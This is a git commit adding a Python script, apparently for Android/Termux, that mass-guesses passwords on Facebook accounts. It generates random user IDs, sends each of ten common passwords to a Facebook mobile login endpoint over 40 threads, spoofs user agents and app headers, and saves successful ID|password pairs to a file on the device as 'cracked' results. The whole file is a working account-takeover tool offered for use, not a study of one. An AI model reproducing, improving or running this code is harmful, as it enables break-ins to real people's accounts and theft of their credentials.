f0a9436efea92b10d99bf3d57d5ea1257c019207
ridstrade <145867334+ridstrade@users.noreply.github.com>
2024-08-05 06:48:58 +0600

    Add files via upload

---
+++ rid-x.py
@@ -0,0 +1,211 @@
+""" code write by @sami__143"""
+#----------------------------[IMPORT/MODULE]-----------------------------------#
+import requests,bs4,json,os,sys,uuid,random,datetime,time,re
+import urllib3,rich,base64,subprocess
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import pretty
+from rich.text import Text as tekz
+from time import localtime as lt
+from rich.panel import Panel
+import os,time,random,json,sys,datetime
+try:
+    import requests
+except:
+    os.system("pip3 install requests")
+    import requests 
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import time,os,json,sys,re,string, random 
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+try:
+    import rich
+except:
+    print("\n[!?] Installing Rich...\n")
+    os.system("pip install rich")
+    import rich
+try:
+    import requests
+except:
+    print("\n[!?] Installing Requests...\n")
+    os.system("pip install requests")
+    import requests
+try:
+    import httpx
+except:
+    print("\n[!?] Installing Httpx...\n")
+    os.system("pip install httpx")
+    import httpx
+try:
+    import bs4
+except:
+    print("\n[!?] Installing Bs4...\n")
+    os.system("pip install bs4")
+    import bs4
+from os import system as shell
+from rich import print
+from rich import print_json
+from rich import pretty
+from rich.progress import track
+from rich.markdown import Markdown
+from rich.tree import Tree
+from rich.panel import Panel
+from rich.padding import Padding
+pretty.install()
+sim = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').replace('\n', '').replace(',', '|')
+def lod(message):
+    for i in track(range(300), description=f"[red][bold] {message}"):
+        time.sleep(0.01)
+import os,time
+#pip install rich
+try:
+    import rich
+except:
+    os.system("pip install rich")
+    import rich
+from rich.progress import track
+def looood(heron):
+    for i in track(range(500),description=heron):
+        time.sleep(0.01) 
+#looood("OPENING")
+def clear():
+    shell("clear")
+#-----------------------------[LINE]-----------------------------------#
+def lin():
+	print("\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+#----------------------------[DATE]-----------------------------------#
+"""dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
+dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
+tgl = datetime.datetime.now().day
+bln = dic[(str(datetime.datetime.now().month))]
+thn = datetime.datetime.now().year
+okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+date = str(tgl)+'-'+str(bln)
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"""
+orange = "\x1b[38;5;196m"
+yellow = "\x1b[38;5;208m"
+black="\033[1;30m"
+rad="\x1b[38;5;160m"
+green="\x1b[38;5;46m"
+yelloww="\033[1;33m"
+blue="\033[38;5;6m"
+purple="\033[1;35m"
+cyan="\033[1;36m"
+white="\033[1;37m"
+faltu = "\033[1;47m"
+pvt = "\033[1;0m"
+gren = "\x1b[38;5;154m"
+gas = "\033[1;32m"
+sm=random.choice(["#","$","+","%","✓","=","÷"])
+#----------------------------[COLOR/CODE]-----------------------------------#
+A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
+#----------------------------[USER/AGENT]-----------------------------------#
+def ua():
+    rr=random.randint
+    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    zA=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
+    rx=random.randrange(1, 999)
+    xx=f"Mozilla/5.0 (Wi    ndows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
+    return xx
+#----------------------------[LOGO]-----------------------------------#
+cv=("[bold red]|──[bold white]Choice Option")
+rr=random.randint
+aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+zA=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
+rx=random.randrange(1, 999)
+xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
+def logo():
+	print(Panel(f"""\r\r\n[bold green]┏┓┓ ┳┓  ┏┓┳┓┏┓┏┓┓┏┓  ┏┓┓[bold white]  ● Version : [bold white]1.0
+[bold green]┃┃┃ ┃┃  ┃ ┣┫┣┫┃ ┃┫   ┣ ┣┓ [cyan]● Feature : [bold white]Old Crack
+[bold green]┗┛┗┛┻┛  ┗┛┛┗┛┗┗┛┛┗┛  ┻ ┗┛ [bold black]● Github  : [bold white]RIAD-123 \n""",title=f"[white reverse]<CODING BY RIAD>"))
+
+#----------------------------[MAIN/DEF]-----------------------------------#
+class start():
+	def lo():
+		clear()
+		logo()
+		looood("Wait a few minute")
+		shell("clear")
+		logo()
+		print(Panel("[bold purple]-![[bold red]A[bold purple]] Crack Old Clone\n[bold purple]-![[bold red]B[bold purple]] Exit Programing"))
+		print(cv)
+		choice=input(f"{R}└──> ")
+		if choice in ["1","A"]:
+			main()
+def main():
+    user=[]
+    os.system("clear")
+    logo()
+    print(Panel("[bold red][[bold purple]Example[bold red][bold red]][bold black] 9999 [bold white]! [bold black] 88888 [bold white]! [bold black] 7777 [bold white]! [bold black] 6666 [bold white]! "))
+    print(cv)
+    limit=input(f"{R}└──> ")
+    lin()
+    os.system('clear')
+    logo()
+    print(Panel("[bold red][[bold purple]Example[bold red][bold red]] SERVER-1"))
+    print(cv)
+    ask=input(f"{R}└──> ")
+    lin()
+    if ask in["1"]:
+        star="10000"
+        for i in range(int(limit)):
+            data=str(random.choice(range(1000000000,1999999999)))
+            user.append(data)
+    else:
+        star="100000"
+        for i in range(int(limit)):
+            data=str(random.choice(range(1000000000,1999999999)))
+            user.append(data)    
+    with ThreadPool(max_workers=40) as sami:
+        os.system('clear')
+        logo()
+        print(Markdown("# Crack Started"))
+        print(Panel(f"[bold purple]-! [bold green]Total Uid [bold red]:[bold white] {limit} [bold purple]-! [bold green]Sim [bold white]: [bold white]{sim}\n[bold purple]-! [bold green]if no result [bold white]on[bold red]/[bold white]off[bold green] airplane mood"))
+        for mal in user:
+            uid=star+mal
+            sami.submit(login,uid)    
+loop=0
+oks=[]
+def login(uid):
+    global oks,loop
+    Session=requests.session()
+    try:
+        sys.stdout.write(f"\r-! [RIAD-69]{sm} - [{loop}] [{len(oks)}]\r")
+        sys.stdout.flush()
+        for pw in ["123456","1234567","12345678","123456789","123123","143143","112233", "654321"," 87654321", "987654321"]:
+            headers = {
+            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
+            "x-fb-net-hni": str(random.randint(20000, 40000)), 
+            "x-fb-connection-quality": "EXCELLENT",
+            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+            "user-agent": ua(), 
+            "content-type": "application/x-www-form-urlencoded", 
+            "x-fb-http-engine": "Liger"}
+            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
+            if "session_key" in rp:
+                print(Panel(f"[bold purple]-! [bold white]SAMI-69[🔶/🔷/💠]\n[bold purple]-! [bold green]Uid [bold red]:[bold green] {uid} \n[bold purple]-! [bold green]Pass [bold red]:[bold green] {pw}\n[bold purple]-! [bold yellow]Ua [bold red]: [bold white]{xx}",title=f"[red reverse][Cracked By Sami]"))
+                open("/sdcard/RIAD-OLD-OK","a").write(uid+"|"+pw+"\n")
+                oks.append(uid)
+                break 
+            elif "www.facebook.com" in rp["error_msg"]:
+                print(Panel(f"[bold purple]-! [bold white]SAMI-69[🔶/🔷/💠]\n[bold purple]-! [bold green]Uid [bold red]:[bold green] {uid} \n[bold purple]-! [bold green]Pass [bold red]:[bold green] {pw}\n[bold purple]-! [bold yellow]Ua [bold red]: [bold white]{xx}",title=f"[red reverse][Cracked By Sami]"))
+                open("/sdcard/RIAD-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                oks.append(uid)
+                break
+            elif "Please Confirm Email" in str(rp):
+                print(Panel(f"[bold purple]-! [bold white]SAMI-69[🔶/🔷/💠]\n[bold purple]-! [bold green]Uid [bold red]:[bold green] {uid} \n[bold purple]-! [bold green]Pass [bold red]:[bold green] {pw}\n[bold purple]-! [bold yellow]Ua [bold red]: [bold white]{xx}",title=f"[red reverse][Cracked By Sami]"))
+                open("/sdcard/RIAD-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                oks.append(uid)
+                break
+            else:continue
+        loop+=1
+    except:pass
+start.lo()
+#----------------------------[CODE/END]-----------------------------------#
